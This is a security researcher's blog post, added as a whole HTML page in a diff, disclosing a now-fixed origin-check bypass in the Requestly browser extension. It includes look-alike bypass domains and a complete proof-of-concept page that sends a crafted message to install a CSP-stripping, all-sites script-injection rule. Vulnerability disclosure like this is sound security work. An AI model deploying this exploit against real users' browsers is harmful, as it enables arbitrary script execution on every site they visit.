@@ -1,0 +1,186 @@
+<!doctype html>
+<html lang=&#34;en&#34;>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#070807">
+  <title>Insecure Origin Check in Extension Requestly Leads to UXSS · Deen&#39;s blog</title>
+  <link rel="icon" href="/images/favicon.ico">
+  <link rel="stylesheet" href="/css/style.css?v=1.1.2"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><main class="site-shell">
+    <header class="site-header">
+  <nav class="site-nav" aria-label="Primary navigation">
+    
+      <a href="/">Home</a>
+    
+      <a href="/archives/">Archives</a>
+    
+      <a href="/about/">About</a>
+    
+  </nav>
+</header>
+<div class="header-rule" aria-hidden="true"></div>
+
+    <article class="post-detail" itemscope itemtype="https://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 itemprop="headline">Insecure Origin Check in Extension Requestly Leads to UXSS</h1>
+    <p class="post-meta">
+      <time datetime="2025-04-12T11:31:22.000Z" itemprop="datePublished">2025-04-12</time>
+      
+    </p>
+  </header>
+  <div class="article-content" itemprop="articleBody"><h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1. Overview"></a>1. Overview</h2><p>Once a victim clicks on the malicious page.</p>
+<p>An attacker can silently configure a rule inside the victim’s Requestly extension, which will result in <strong>arbitrary JavaScript code execution across all websites</strong> the victim visits.</p>
+<h2 id="2-Introduction-to-Requestly"><a href="#2-Introduction-to-Requestly" class="headerlink" title="2. Introduction to Requestly"></a>2. Introduction to Requestly</h2><p><a href="https://requestly.io/">Requestly</a> is a popular(more than 200000users) Chrome extension that allows developers and testers to intercept, modify, and redirect network requests directly from the browser. It supports use cases such as:</p>
+<ul>
+<li>Modifying HTTP request/response headers</li>
+<li>Redirecting URLs</li>
+<li>Blocking requests</li>
+<li>Rewriting content</li>
+<li><strong>Executing custom scripts</strong></li>
+<li>…</li>
+</ul>
+<p><img src="https://1drv.ms/i/c/9d4486fb0e0ac9fc/IQRuQFdmPonARaf00l-pdXaVAcMlDdn3GCe_vVXZzYB_ahk" alt="image"></p>
+<h3 id="2-1-How-does-Requestly-work"><a href="#2-1-How-does-Requestly-work" class="headerlink" title="2.1 How does Requestly work"></a>2.1 How does Requestly work</h3><p>It took me quite some time to figure this out. I found the vulnerable code firstly, but I didn’t where can I trigger it. </p>
+<p>But there are only a few ways for browser extensions to interact with the page.</p>
+<p>We can download the source code to review. </p>
+<p><a href="https://github.com/requestly/requestly">https://github.com/requestly/requestly</a></p>
+<p><img src="https://1drv.ms/i/c/9d4486fb0e0ac9fc/IQRhzeRsFShlSoU5TrsjS6o5AZLhH2mjyNhoMhbKlF6wdcE" alt="image"></p>
+<h2 id="3-Vulnerability-Detail"><a href="#3-Vulnerability-Detail" class="headerlink" title="3. Vulnerability Detail"></a>3. Vulnerability Detail</h2><p>The vulnerable code resides in <strong>app.cs.js</strong> and is only loaded and executed on the websites app.requestly.io or app.requestly.com.</p>
+<ol>
+<li>using isAppURL to check event.origin <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> initMessageHandler = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">window</span>.addEventListener(</span><br><span class="line">    <span class="string">"message"</span>,</span><br><span class="line">    <span class="keyword">async</span> (event: MessageEvent): <span class="built_in">Promise</span>&lt;<span class="keyword">void</span>&gt; =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (event &amp;&amp; !isAppURL(event.origin)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (config.logLevel === <span class="string">"debug"</span>) &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">"Ignoring message from the following domain"</span>, event.origin, event.data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2. isAppURL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">use `</span>includes<span class="string">` method to check, it can be bypassed easily. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> isAppURL = <span class="function">(<span class="params">url: string</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> !!url &amp;&amp; getAllSupportedWebURLs().some(<span class="function">(<span class="params">webURL</span>) =&gt;</span> url.includes(webURL));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getAllSupportedWebURLs = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> webURLsSet = <span class="keyword">new</span> <span class="built_in">Set</span>([config.WEB_URL, ...config.OTHER_WEB_URLS]);</span><br><span class="line">  <span class="keyword">return</span> [...webURLsSet];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">WEB_URL: <span class="string">"https://app.requestly.io"</span>,</span><br><span class="line">OTHER_WEB_URLS: [<span class="string">"https://app.requestly.com"</span>],</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>So this check can be bypassed with such origins: </p>
+<ul>
+<li><code>https://app.requestly.io.attacker.com</code></li>
+<li><code>https://app.requestly.com.attacker.com</code></li>
+</ul>
+<h2 id="4-Proof-of-Concept"><a href="#4-Proof-of-Concept" class="headerlink" title="4. Proof of Concept"></a>4. Proof of Concept</h2><p><a href="https://app.requestly.io.cdn.cloud.d33n.cn/requestly-poc.html">https://app.requestly.io.cdn.cloud.d33n.cn/requestly-poc.html</a></p>
+<p><img src="https://1drv.ms/i/c/9d4486fb0e0ac9fc/IQRopWh3wURbTrgHVFft-x1_AZjtdHOTUI4lXHiJAX_qAtE" alt="image"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;Requestly POC&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h1&gt;Requestly POC&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">  &lt;button id="openRequestly"&gt;Click&lt;/</span>button&gt;</span><br><span class="line"></span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="keyword">const</span> messageData = &#123;</span><br><span class="line">      action: <span class="string">"SAVE_STORAGE_OBJECT"</span>,</span><br><span class="line">      object: &#123;</span><br><span class="line">        Script_za0bp: &#123;</span><br><span class="line">          createdBy: <span class="string">"km9RYPyCWDO8tPXWg0BrbtSuNQ22"</span>,</span><br><span class="line">          creationDate: <span class="number">1744411128046</span>,</span><br><span class="line">          currentOwner: <span class="string">"km9RYPyCWDO8tPXWg0BrbtSuNQ22"</span>,</span><br><span class="line">          description: <span class="string">""</span>,</span><br><span class="line">          extensionRules: [</span><br><span class="line">            &#123;</span><br><span class="line">              action: &#123;</span><br><span class="line">                type: <span class="string">"modifyHeaders"</span>,</span><br><span class="line">                responseHeaders: [</span><br><span class="line">                  &#123;</span><br><span class="line">                    header: <span class="string">"Content-Security-Policy"</span>,</span><br><span class="line">                    operation: <span class="string">"remove"</span></span><br><span class="line">                  &#125;</span><br><span class="line">                ]</span><br><span class="line">              &#125;,</span><br><span class="line">              condition: &#123;</span><br><span class="line">                urlFilter: <span class="string">"http"</span>,</span><br><span class="line">                isUrlFilterCaseSensitive: <span class="literal">true</span>,</span><br><span class="line">                excludedInitiatorDomains: [],</span><br><span class="line">                excludedRequestDomains: [],</span><br><span class="line">                resourceTypes: [<span class="string">"main_frame"</span>, <span class="string">"sub_frame"</span>]</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          groupId: <span class="string">""</span>,</span><br><span class="line">          id: <span class="string">"Script_za0bp"</span>,</span><br><span class="line">          isSample: <span class="literal">false</span>,</span><br><span class="line">          lastModifiedBy: <span class="string">"km9RYPyCWDO8tPXWg0BrbtSuNQ22"</span>,</span><br><span class="line">          modificationDate: <span class="number">1744411344928</span>,</span><br><span class="line">          name: <span class="string">"script-1744411128049"</span>,</span><br><span class="line">          objectType: <span class="string">"rule"</span>,</span><br><span class="line">          pairs: [</span><br><span class="line">            &#123;</span><br><span class="line">              id: <span class="string">"7b7l0"</span>,</span><br><span class="line">              scripts: [</span><br><span class="line">                &#123;</span><br><span class="line">                  attributes: [],</span><br><span class="line">                  codeType: <span class="string">"js"</span>,</span><br><span class="line">                  fileName: <span class="string">""</span>,</span><br><span class="line">                  id: <span class="string">"33p99"</span>,</span><br><span class="line">                  loadTime: <span class="string">"afterPageLoad"</span>,</span><br><span class="line">                  type: <span class="string">"code"</span>,</span><br><span class="line">                  value: <span class="string">'\talert("hacked " + document.domain);'</span></span><br><span class="line">                &#125;</span><br><span class="line">              ],</span><br><span class="line">              source: &#123;</span><br><span class="line">                key: <span class="string">"Url"</span>,</span><br><span class="line">                operator: <span class="string">"Matches"</span>,</span><br><span class="line">                value: <span class="string">"/.*/"</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          removeCSPHeader: <span class="literal">true</span>,</span><br><span class="line">          ruleType: <span class="string">"Script"</span>,</span><br><span class="line">          status: <span class="string">"Active"</span>,</span><br><span class="line">          schemaVersion: <span class="string">"3.0.0"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      requestId: <span class="number">55</span>,</span><br><span class="line">      source: <span class="string">"page_script"</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"openRequestly"</span>).addEventListener(<span class="string">"click"</span>, () =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> popup = <span class="built_in">window</span>.open(</span><br><span class="line">        <span class="string">"https://app.requestly.com/assets/media/common/rq_logo_full.svg"</span>,</span><br><span class="line">        <span class="string">"requestly"</span>,</span><br><span class="line">        <span class="string">"width=1,height=1,left=9999,top=9999,toolbar=no,scrollbars=no,resizable=no"</span></span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> sendMessage = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (popup &amp;&amp; !popup.closed) &#123;</span><br><span class="line">          popup.postMessage(messageData, <span class="string">"*"</span>);</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">"Message sent."</span>);</span><br><span class="line">          <span class="built_in">window</span>.open(</span><br><span class="line">              <span class="string">"https://www.google.com"</span>,</span><br><span class="line">              <span class="string">"google"</span></span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.warn(<span class="string">"Popup was blocked or closed."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        sendMessage();</span><br><span class="line">      &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="5-Recommendation"><a href="#5-Recommendation" class="headerlink" title="5. Recommendation"></a>5. Recommendation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> trustedOrigins = [<span class="string">"https://api.requestly.io"</span>, <span class="string">"https://api.requestly.com"</span>];</span><br><span class="line"><span class="keyword">if</span> (!trustedOrigins.includes(event.origin)) &#123;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-Timeline"><a href="#6-Timeline" class="headerlink" title="6. Timeline"></a>6. Timeline</h2><table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2025-04-10</td>
+<td>Vulnerability discovered</td>
+</tr>
+<tr>
+<td>2025-04-11</td>
+<td>Proof of concept developed</td>
+</tr>
+<tr>
+<td>2025-04-12</td>
+<td>Reported the issue to the Requestly</td>
+</tr>
+<tr>
+<td>2025-04-14</td>
+<td>Fixed</td>
+</tr>
+</tbody></table>
+<h2 id="7-Credits"><a href="#7-Credits" class="headerlink" title="7. Credits"></a>7. Credits</h2><p>This vulnerability was discovered by Deen.</p>
+</div>
+</article>
+
+    <footer class="site-footer">
+  Copyright © 2026 Deen&#39;s blog
+</footer>
+
+  </main>
+  <script>
+    (function () {
+      var terminal = document.querySelector('[data-terminal-intro]');
+      var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+      if (!terminal || reduceMotion) return;
+
+      var introSeen = false;
+      try { introSeen = window.sessionStorage.getItem('deen-terminal-intro-seen') === '1'; } catch (error) {}
+      if (introSeen) return;
+      try { window.sessionStorage.setItem('deen-terminal-intro-seen', '1'); } catch (error) {}
+
+      var root = document.documentElement;
+      var lines = terminal.querySelectorAll('.terminal-command .terminal-typed');
+      var output = terminal.querySelector('.terminal-output');
+      var cursors = terminal.querySelectorAll('.terminal-cursor');
+      var list = document.querySelector('.post-list');
+      var pagination = document.querySelector('.terminal-status');
+      var text = Array.prototype.map.call(lines, function (line) { return line.textContent; });
+      var delay = function (milliseconds) { return new Promise(function (resolve) { window.setTimeout(resolve, milliseconds); }); };
+      var type = function (line, value) {
+        line.textContent = '';
+        return new Promise(function (resolve) {
+          var index = 0;
+          var tick = function () {
+            line.textContent += value.charAt(index++);
+            if (index < value.length) window.setTimeout(tick, 28);
+            else resolve();
+          };
+          tick();
+        });
+      };
+
+      root.classList.add('terminal-booting');
+      cursors[0].classList.add('is-active');
+      output.classList.remove('is-visible');
+      type(lines[0], text[0])
+        .then(function () {
+          cursors[0].classList.remove('is-active');
+          output.classList.add('is-visible');
+          return delay(260);
+        })
+        .then(function () { cursors[1].classList.add('is-active'); })
+        .then(function () { return type(lines[1], text[1]); })
+        .then(function () {
+          cursors[1].classList.remove('is-active');
+          Array.prototype.forEach.call(list.children, function (item, index) {
+            item.style.transitionDelay = (index * 42) + 'ms';
+            item.classList.add('is-visible');
+          });
+          if (pagination) pagination.classList.add('is-visible');
+          root.classList.remove('terminal-booting');
+        });
+    }());
+
+    document.querySelectorAll('.article-content .highlight').forEach(function (block) {
+      var code = block.querySelector('code, td.code, pre');
+      if (!code) return;
+      var className = block.className.split(/\s+/).find(function (name) { return name !== 'highlight'; });
+      var toolbar = document.createElement('div');
+      toolbar.className = 'code-toolbar';
+      toolbar.innerHTML = '<span class="code-controls" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-language"></span><button type="button" data-copy-code>Copy</button>';
+      toolbar.querySelector('.code-language').textContent = className || 'text';
+      block.prepend(toolbar);
+      var table = block.querySelector('table');
+      if (table) {
+        var scroller = document.createElement('div');
+        scroller.className = 'code-scroll';
+        table.parentNode.insertBefore(scroller, table);
+        scroller.appendChild(table);
+      }
+    });
+    document.addEventListener('click', function (event) {
+      var button = event.target.closest('[data-copy-code]');
+      if (!button) return;
+      var code = button.closest('.highlight, .code-block').querySelector('code, td.code, pre');
+      if (!code || !navigator.clipboard) return;
+      navigator.clipboard.writeText(code.innerText).then(function () {
+        button.textContent = 'Copied';
+        window.setTimeout(function () { button.textContent = 'Copy'; }, 1400);
+      });
+    });
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
